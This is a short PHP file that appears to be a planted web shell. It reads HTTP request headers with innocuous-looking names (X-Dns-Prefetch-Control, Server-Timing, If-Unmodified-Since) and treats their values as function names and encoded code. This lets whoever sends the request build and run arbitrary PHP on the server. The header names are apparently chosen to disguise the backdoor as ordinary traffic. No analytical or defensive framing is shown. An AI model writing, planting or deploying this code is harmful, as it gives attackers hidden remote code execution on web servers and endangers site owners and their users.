<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $rjust = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Server-Timing']($_HEADERS['If-Unmodified-Since']));
    $rjust();
}